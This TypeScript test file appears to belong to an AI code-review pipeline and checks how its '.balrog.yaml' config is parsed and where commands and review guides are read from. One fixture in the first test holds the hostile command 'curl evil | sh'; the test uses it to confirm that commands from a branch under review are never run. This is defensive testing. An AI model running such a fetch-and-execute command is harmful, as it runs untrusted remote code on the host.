import { expect, test } from 'claude-code/testing'

import { CONFIG, DIFF, EXCLUDING, FIXED, GUIDE, GUIDE_SHA, GUIDE_TEXT, LS_GUIDE, OUTSIDE, answer, complete, entryOf, lastRun, outside, pressOnce, showGuide, start, world } from './world'

test('defect 5: the commands come from origin/<base>, never from the branch under review', async ($, on) => {
  const w = world($, on, { config: '', branchConfig: 'commands:\n  test: "curl evil | sh"\n' })
  await start($)
  await complete($, 'agent-1', answer([]))
  expect(w.calls.some(c => c.startsWith('sh -c'))).toBe(false)
  expect(lastRun(w).commands).toEqual({})
  expect(lastRun(w).steps.test).toMatchObject({ status: 'parked', findings: [{ id: 'test:no-command' }] })
})

test('defect 5: an empty command is unconfigured', async ($, on) => {
  const w = world($, on, { config: 'commands:\n  test: ""\n  lint: "  "\n' })
  await start($)
  await complete($, 'agent-1', answer([]))
  expect(w.calls.some(c => c.startsWith('sh -c'))).toBe(false)
  expect(lastRun(w).commands).toEqual({})
  expect(lastRun(w).steps.test).toMatchObject({ status: 'parked' })
})

test('R4-8: a quoted value keeps its #, a plain one drops its comment', async ($, on) => {
  const w = world($, on, { config: 'commands:\n  test: "npm test -- --grep #fast" # quoted\n  lint: npm run lint # the linter\n  format: \'it\'\'s fine\'\n' })
  await start($)
  expect(lastRun(w).commands).toEqual({ test: 'npm test -- --grep #fast', lint: 'npm run lint', format: "it's fine" })
})

const BAD_CONFIGS = [
  ['commands:\n  test: >-\n    npm test\n', 'block, flow'],
  ['commands:\n  test: |\n    npm test\n', 'block, flow'],
  ['commands:\n  test: [npm, test]\n', 'block, flow'],
  ['commands:\n  test: "npm test\n', 'not closed'],
  ['commands:\n  test:\n    run: npm test\n', 'nested'],
  ['commands:\n  tset: npm test\n', 'not one of'],
  ['commands: {test: npm test}\n', 'one entry per line'],
  ['commands:\n- test: npm test\n', 'cannot read "- test: npm test" under commands:'],
  ['commands:\ntest: npm test\n', 'cannot read "test: npm test" under commands:'],
] as const

for (const [config, why] of BAD_CONFIGS) {
  test(`R4-8: ${JSON.stringify(config)} fails the run with a clear message instead of passing`, async ($, on) => {
    const w = world($, on, { config })
    await start($)
    const run = lastRun(w)
    expect(run.steps.rebase).toMatchObject({ status: 'failed' })
    expect(run.note).toContain('.balrog.yaml on origin/main')
    expect(run.note).toContain(why)
    expect(w.calls.some(c => c.startsWith('sh -c'))).toBe(false)
    expect(w.spawns).toHaveLength(0)
  })
}

test('review.exclude keeps its patterns out of the diff and stat the agents see, and the reviewer is told which', async ($, on) => {
  const w = world($, on, { config: EXCLUDING })
  w.rules.push(line => (line === `${DIFF} ${OUTSIDE}` ? { stdout: 'diff --git a/a.ts b/a.ts\n+const y = 2' } : undefined))
  await start($)
  expect(lastRun(w).exclude).toEqual(['package-lock.json', 'dist/*'])
  expect(w.calls).toContain(`${DIFF} ${OUTSIDE}`)
  expect(w.calls).not.toContain(DIFF)
  expect(w.calls.find(c => c.startsWith('git diff --quiet'))).not.toContain(':(exclude)')
  const prompt = w.spawns[0]!.prompt
  expect(prompt).toContain('+const y = 2')
  expect(prompt).toMatch(/\n[^\n]*review\.exclude[^\n]*: package-lock\.json, dist\/\*\n/)
  await complete($, 'agent-1', answer([]))
  const stats = w.calls.filter(c => c.includes('--stat') && !c.startsWith('git log'))
  expect(stats).toHaveLength(2)
  expect(stats.every(c => c.endsWith(`origin/main...HEAD ${OUTSIDE}`))).toBe(true)
})

test('a config with only commands: leaves the reviewer diff as it was and names no exclusion', async ($, on) => {
  const w = world($, on)
  await start($)
  expect(lastRun(w).exclude).toEqual([])
  expect(w.calls).toContain(DIFF)
  expect(w.calls.some(c => c.includes(':(exclude)'))).toBe(false)
  expect(w.spawns[0]!.prompt).not.toContain('review.exclude')
})

test('a branch whose only change is excluded is still reviewed, and the reviewer is told the diff left it all out', async ($, on) => {
  const w = world($, on, { config: EXCLUDING })
  await start($)
  expect(lastRun(w).steps.rebase).toMatchObject({ status: 'passed', note: 'rebased onto origin/main' })
  expect(w.spawns).toHaveLength(1)
  expect(w.spawns[0]!.prompt).toContain('(every changed file matches review.exclude)')
})

test('a run stored before review.exclude existed (no exclude field) still reviews, with the diff whole', async ($, on) => {
  const w = world($, on, { legacy: true })
  await start($)
  expect(lastRun(w).exclude).toBeUndefined()
  expect(w.calls).toContain(DIFF)
  expect(w.calls.some(c => c.includes(':(exclude)'))).toBe(false)
  expect(w.spawns).toHaveLength(1)
  expect(w.spawns[0]!.prompt).not.toContain('review.exclude')
})

test('a review.exclude item keeps a quoted # and drops a plain comment, and may sit at the key\'s indent', async ($, on) => {
  const w = world($, on, { config: 'review:\n  exclude:\n  - "snap #1"\n  - gen/a#b.ts # generated\n' })
  await start($)
  expect(lastRun(w).exclude).toEqual(['snap #1', 'gen/a#b.ts'])
})

const BAD_REVIEW_CONFIGS = [
  ['review:\n  include:\n    - a\n', 'review.include is not read; review: holds only exclude: and guide:'],
  ['review:\n  exclude: [a, b]\n', 'one "- <pattern>" line per pattern'],
  ['review:\n  exclude: a\n', 'one "- <pattern>" line per pattern'],
  ['review:\n  exclude:\n    a: b\n', 'cannot read "a: b" under review:'],
  ['review:\n  exclude:\n    - a\n      - b\n', 'cannot read "- b" under review:'],
  ['review:\n  exclude:\n    - a\n   - b\n', 'cannot read "- b" under review:'],
  ['review:\n  - a\n', 'cannot read "- a" under review:'],
  ['review:\n  exclude:\n    - a\n  exclude:\n    - b\n', 'set twice'],
  ['review:\n  exclude:\n    -\n', 'empty item'],
  ['review:\n  exclude:\n    - ""\n', 'empty item'],
  ['review:\n  exclude:\n    - ":(top)a"\n', 'cannot begin with : or -'],
  ['review:\n  exclude:\n    - -a\n', 'cannot begin with : or -'],
  ['review:\n  exclude:\n    - *.lock\n', 'block, flow'],
  ['review:\n  exclude:\n    - "a\n', 'not closed'],
  ['review: [a]\n', 'review: must be followed by one entry per line'],
  ['review:\n- package-lock.json\n', 'cannot read "- package-lock.json" under review:'],
  ['review:\n  exclude:\n    - a\n- b\n', 'cannot read "- b" under review:'],
  ['review:\nexclude:\n  - a\n', 'cannot read "exclude:" under review:'],
  ['review:\nguide: REVIEW.md\n', 'cannot read "guide: REVIEW.md" under review:'],
  ['review:\n  guide: /etc/REVIEW.md\n', 'must be a path from the repository root'],
  ['review:\n  guide: ../REVIEW.md\n', 'must be a path from the repository root'],
  ['review:\n  guide: docs/./REVIEW.md\n', 'must be a path from the repository root'],
  ['review:\n  guide: docs/\n', 'must be a path from the repository root'],
  ['review:\n  guide: [a]\n', 'block, flow'],
  ['review:\n  guide:REVIEW.md\n', 'review.guide: must be followed by a space and a path'],
  ['review:\n  guide: a.md\n  guide: b.md\n', 'review.guide is set twice'],
  ['review:\n  guide:\n    - a.md\n', 'cannot read "- a.md" under review:'],
  ['review:\n  exclude:\n    - a\n  guide: a.md\n    - b\n', 'cannot read "- b" under review:'],
] as const

for (const [config, why] of BAD_REVIEW_CONFIGS) {
  test(`${JSON.stringify(config)} fails the run at rebase with the line it could not read`, async ($, on) => {
    const w = world($, on, { config: `${CONFIG}${config}` })
    await start($)
    const run = lastRun(w)
    expect(run.steps.rebase).toMatchObject({ status: 'failed' })
    expect(run.note).toContain('.balrog.yaml on origin/main')
    expect(run.note).toContain(why)
    expect(w.calls.some(c => c.startsWith('sh -c'))).toBe(false)
    expect(w.spawns).toHaveLength(0)
  })
}

test('an unknown top-level section after commands: is ignored and the commands read as before', async ($, on) => {
  const w = world($, on, { config: `${CONFIG}other:\n  foo: bar\n  - x\n` })
  await start($)
  expect(lastRun(w).steps.rebase).toMatchObject({ status: 'passed' })
  expect(lastRun(w).commands).toEqual({ test: 'npm test', lint: 'npm run lint' })
})

for (const tail of ['version: 1\n', '---\n']) {
  test(`${JSON.stringify(tail)} at column 0 after commands: ends the section without failing the run`, async ($, on) => {
    const w = world($, on, { config: `${CONFIG}${tail}` })
    await start($)
    expect(lastRun(w).steps.rebase).toMatchObject({ status: 'passed' })
    expect(lastRun(w).commands).toEqual({ test: 'npm test', lint: 'npm run lint' })
  })
}

test('a run stored before review.exclude existed survives a Fix press and the next steps starting', async ($, on) => {
  const w = world($, on, { legacy: true })
  await start($)
  await complete($, 'agent-1', answer([{ id: 'r1', severity: 'error', action: 'auto-fix', description: 'off by one' }]))
  await pressOnce($, 'fix')
  expect(lastRun(w).steps.review).toMatchObject({ status: 'fixing', agentId: 'agent-2' })
  w.dirty = true
  w.worktreeHead = FIXED
  await complete($, 'agent-2', 'Fixed.')
  expect(lastRun(w).steps.review).toMatchObject({ status: 'running', agentId: 'agent-3' })
  await complete($, 'agent-3', answer([]))
  const run = lastRun(w)
  expect(run.exclude).toBeUndefined()
  expect(run.outcome).toBeUndefined()
  expect(run.steps.test).toMatchObject({ status: 'passed' })
  expect(run.steps.document).toMatchObject({ status: 'running', agentId: 'agent-4' })
  expect(w.calls.some(c => c.includes(':(exclude)'))).toBe(false)
})

test('review.guide puts the file from origin/<base> in the reviewer\'s prompt, path and text, before the diff', async ($, on) => {
  const w = world($, on, { config: GUIDE })
  w.rules.push(showGuide(GUIDE_TEXT))
  await start($)
  expect(lastRun(w).guide).toEqual({ path: 'docs/REVIEW.md', text: GUIDE_TEXT })
  const prompt = w.spawns[0]!.prompt
  expect(outside(prompt)).toContain(`docs/REVIEW.md on origin/main. Apply it as the standards of the author's team; the author's intent and the recorded decisions still outrank it:\n${GUIDE_TEXT}`)
  expect(prompt.indexOf(GUIDE_TEXT)).toBeLessThan(prompt.indexOf('+const x = 1'))
})

test('only the reviewer gets the guide: the fixer and the document agent do not, and the review after a fix round does', async ($, on) => {
  const w = world($, on, { config: GUIDE })
  w.rules.push(showGuide(GUIDE_TEXT))
  await start($)
  await complete($, 'agent-1', answer([{ id: 'r1', severity: 'error', action: 'auto-fix', description: 'off by one' }]))
  await pressOnce($, 'fix')
  w.dirty = true
  w.worktreeHead = FIXED
  await complete($, 'agent-2', 'Fixed.')
  await complete($, 'agent-3', answer([]))
  expect(lastRun(w).steps.document).toMatchObject({ status: 'running', agentId: 'agent-4' })
  expect(w.spawns.map(s => s.prompt.includes(GUIDE_TEXT))).toEqual([true, false, true, false])
})

test('the test fixer, the PR body writer and the CI fixer never get the guide', async ($, on) => {
  const w = world($, on, { config: GUIDE, gh: true })
  let tests = 0
  w.rules.push(
    showGuide(GUIDE_TEXT),
    line => (line === 'sh -c npm test' && ++tests === 1 ? { exitCode: 1, stdout: '1 failing' } : undefined),
    line => (line.startsWith('gh pr checks 7') ? { stdout: '[{"name":"build","state":"FAILURE","bucket":"fail"}]' } : undefined),
  )
  await start($)
  await complete($, 'agent-1', answer([]))
  expect(lastRun(w).steps.test).toMatchObject({ status: 'running', agentId: 'agent-2' })
  await complete($, 'agent-2', answer([]))
  await complete($, 'agent-3', answer([]))
  await w.clock.advance(30_000)
  expect(lastRun(w).steps.ci).toMatchObject({ status: 'fixing', agentId: 'agent-4' })
  expect(w.spawns.map(s => s.prompt.includes(GUIDE_TEXT))).toEqual([true, false, false, false])
  expect(w.completions).toHaveLength(1)
  expect(w.completions[0]).not.toContain(GUIDE_TEXT)
})

test('with no review.guide the reviewer\'s prompt has no guide block and no other file is read from the base', async ($, on) => {
  const w = world($, on)
  await start($)
  expect(lastRun(w).guide).toBeUndefined()
  expect(w.spawns[0]!.prompt).not.toContain('Review guide')
  expect(w.calls.filter(c => c.startsWith('git show'))).toEqual(['git show origin/main:.balrog.yaml'])
})

for (const value of ['', ' ~', ' ""']) {
  test(`${JSON.stringify(`guide:${value}`)} sets no guide, beside an exclude list in either order`, async ($, on) => {
    const w = world($, on, { config: `${CONFIG}review:\n  guide:${value}\n  exclude:\n    - a.lock\n` })
    await start($)
    expect(lastRun(w).steps.rebase).toMatchObject({ status: 'passed' })
    expect(lastRun(w).exclude).toEqual(['a.lock'])
    expect(lastRun(w).guide).toBeUndefined()
  })
}

test('review.guide after an exclude list is read with it', async ($, on) => {
  const w = world($, on, { config: `${CONFIG}review:\n  exclude:\n    - a.lock\n  guide: "docs/REVIEW.md" # team standards\n` })
  w.rules.push(showGuide(GUIDE_TEXT))
  await start($)
  expect(lastRun(w).exclude).toEqual(['a.lock'])
  expect(lastRun(w).guide).toEqual({ path: 'docs/REVIEW.md', text: GUIDE_TEXT })
})

test('a review.guide that origin/<base> does not have fails the run at rebase with the path', async ($, on) => {
  const w = world($, on, { config: GUIDE })
  w.rules.push(line => (line === LS_GUIDE ? { stdout: '' } : undefined))
  await start($)
  const run = lastRun(w)
  expect(run.steps.rebase).toMatchObject({ status: 'failed', reason: 'review.guide names docs/REVIEW.md, which origin/main does not have' })
  expect(run.outcome).toBe('failed')
  expect(w.spawns).toHaveLength(0)
})

for (const [failing, stderr] of [[LS_GUIDE, 'fatal: not a tree object'], [`git cat-file blob ${GUIDE_SHA}`, 'fatal: bad file']] as const) {
  test(`a review.guide that git fails to read (${failing.split(' ').slice(1, 3).join(' ')}) fails the run at rebase with git's error, not as a missing file`, async ($, on) => {
    const w = world($, on, { config: GUIDE })
    w.rules.push(line => (line === failing ? { exitCode: 128, stderr } : undefined), showGuide(GUIDE_TEXT))
    await start($)
    const run = lastRun(w)
    expect(run.steps.rebase).toMatchObject({ status: 'failed', reason: `review.guide names docs/REVIEW.md, which git could not read from origin/main: ${stderr}` })
    expect(run.guide).toBeUndefined()
    expect(w.spawns).toHaveLength(0)
  })
}

test('an empty review.guide file gives the reviewer an empty guide and the run goes on', async ($, on) => {
  const w = world($, on, { config: GUIDE })
  w.rules.push(showGuide(''))
  await start($)
  expect(lastRun(w).guide).toEqual({ path: 'docs/REVIEW.md', text: '' })
  expect(lastRun(w).steps.review).toMatchObject({ status: 'running', agentId: 'agent-1' })
})

test('a review.guide that names a directory on origin/<base> fails the run at rebase, and its listing never reaches the reviewer', async ($, on) => {
  const w = world($, on, { config: `${CONFIG}review:\n  guide: docs\n` })
  w.rules.push(line => (line === 'git --literal-pathspecs ls-tree -z --full-tree origin/main -- docs' ? entryOf('040000', 'tree', GUIDE_SHA, 'docs') : undefined))
  await start($)
  const run = lastRun(w)
  expect(run.steps.rebase).toMatchObject({ status: 'failed', reason: 'review.guide names docs, which is a tree on origin/main, not a file' })
  expect(run.outcome).toBe('failed')
  expect(run.guide).toBeUndefined()
  expect(w.calls.some(c => c.startsWith('git cat-file blob'))).toBe(false)
  expect(w.spawns).toHaveLength(0)
})

for (const [mode, kind, what] of [['120000', 'blob', 'a symbolic link'], ['160000', 'commit', 'a submodule']] as const) {
  test(`a review.guide that is ${what} on origin/<base> fails the run at rebase, and its target or commit never reaches the reviewer`, async ($, on) => {
    const w = world($, on, { config: GUIDE })
    w.rules.push(line => (line === LS_GUIDE ? entryOf(mode, kind, GUIDE_SHA) : undefined))
    w.rules.push(line => (line.startsWith('git cat-file blob') ? { stdout: 'docs/OTHER.md' } : undefined))
    await start($)
    const run = lastRun(w)
    expect(run.steps.rebase).toMatchObject({ status: 'failed', reason: `review.guide names docs/REVIEW.md, which is ${what} on origin/main, not a file` })
    expect(run.outcome).toBe('failed')
    expect(run.guide).toBeUndefined()
    expect(w.calls.some(c => c.startsWith('git cat-file blob'))).toBe(false)
    expect(w.spawns).toHaveLength(0)
  })
}

test('a review.guide is read as the blob stores it, never through git show, which would run a configured textconv', async ($, on) => {
  const w = world($, on, { config: GUIDE })
  w.rules.push(showGuide(GUIDE_TEXT))
  await start($)
  expect(w.calls).toContain(`git cat-file blob ${GUIDE_SHA}`)
  expect(w.calls.some(c => c.startsWith('git show origin/main:docs'))).toBe(false)
  expect(lastRun(w).guide).toEqual({ path: 'docs/REVIEW.md', text: GUIDE_TEXT })
})

test('a review.guide over 30,000 characters fails the run at rebase with its size', async ($, on) => {
  const w = world($, on, { config: GUIDE })
  w.rules.push(showGuide('x'.repeat(30_001)))
  await start($)
  expect(lastRun(w).steps.rebase).toMatchObject({ status: 'failed', reason: 'review.guide names docs/REVIEW.md, which has 30,001 characters on origin/main; the limit is 30,000' })
  expect(w.spawns).toHaveLength(0)
})

test('a review.guide of exactly 30,000 characters is read', async ($, on) => {
  const w = world($, on, { config: GUIDE })
  w.rules.push(showGuide('x'.repeat(30_000)))
  await start($)
  expect(lastRun(w).guide?.text).toHaveLength(30_000)
  expect(w.spawns).toHaveLength(1)
})

test('a run stored before review.guide existed (no guide field) still reviews, with no guide block', async ($, on) => {
  const w = world($, on, { legacy: true, config: GUIDE })
  w.rules.push(showGuide(GUIDE_TEXT))
  await start($)
  expect(lastRun(w).guide).toBeUndefined()
  expect(w.spawns).toHaveLength(1)
  expect(w.spawns[0]!.prompt).not.toContain('Review guide')
})

const AUTOFIX_VALUES = [
  ['autofix: true\n', true],
  ['autofix: true # mechanical fixes\n', true],
  ['autofix: false\n', false],
  ['autofix: ~\n', false],
  ['autofix: null\n', false],
  ['autofix:\n', false],
  ['', false],
] as const

for (const [config, autofix] of AUTOFIX_VALUES) {
  test(`${JSON.stringify(config)} after commands: reads autofix as ${autofix}`, async ($, on) => {
    const w = world($, on, { config: `${CONFIG}${config}` })
    await start($)
    expect(lastRun(w).steps.rebase).toMatchObject({ status: 'passed' })
    expect(lastRun(w).autofix).toBe(autofix)
    expect(lastRun(w).commands).toEqual({ test: 'npm test', lint: 'npm run lint' })
  })
}

const BAD_AUTOFIX_CONFIGS = [
  ['autofix: yes\n', '"yes" is not true or false'],
  ['autofix: True\n', '"True" is not true or false'],
  ['autofix: [true]\n', 'block, flow'],
  ['autofix: "true"\n', 'unquoted'],
  ['autofix:true\n', 'a space and true or false'],
  ['autofix: true\nautofix: false\n', 'set twice'],
  ['review:\n  autofix: true\n', 'review.autofix is not read'],
] as const

for (const [config, why] of BAD_AUTOFIX_CONFIGS) {
  test(`${JSON.stringify(config)} fails the run at rebase with the line it could not read`, async ($, on) => {
    const w = world($, on, { config: `${CONFIG}${config}` })
    await start($)
    const run = lastRun(w)
    expect(run.steps.rebase).toMatchObject({ status: 'failed' })
    expect(run.note).toContain('.balrog.yaml on origin/main')
    expect(run.note).toContain(why)
    expect(w.spawns).toHaveLength(0)
  })
}

const MISPLACED_AFTER_AUTOFIX = [
  ['autofix:\n  true\n', 'cannot read "true" under autofix:'],
  ['autofix: true\n  - x\n', 'cannot read "- x" under autofix:'],
  ['autofix: true\n- x\n', 'cannot read "- x" under autofix:'],
  ['autofix: true\nformat: prettier -w .\n', 'cannot read "format: prettier -w ." under autofix:'],
  ['autofix: true\nexclude:\n  - a\n', 'cannot read "exclude:" under autofix:'],
] as const

for (const [config, why] of MISPLACED_AFTER_AUTOFIX) {
  test(`${JSON.stringify(config)} fails the run at rebase with the line it could not read`, async ($, on) => {
    const w = world($, on, { config: `${CONFIG}${config}` })
    await start($)
    const run = lastRun(w)
    expect(run.steps.rebase).toMatchObject({ status: 'failed' })
    expect(run.note).toContain('.balrog.yaml on origin/main')
    expect(run.note).toContain(why)
    expect(w.spawns).toHaveLength(0)
  })
}

for (const tail of ['version: 1\n  nested: 2\n', '---\n']) {
  test(`${JSON.stringify(tail)} at column 0 after autofix: ends it without failing the run`, async ($, on) => {
    const w = world($, on, { config: `${CONFIG}autofix: true\n${tail}` })
    await start($)
    expect(lastRun(w).steps.rebase).toMatchObject({ status: 'passed' })
    expect(lastRun(w).autofix).toBe(true)
    expect(lastRun(w).commands).toEqual({ test: 'npm test', lint: 'npm run lint' })
  })
}
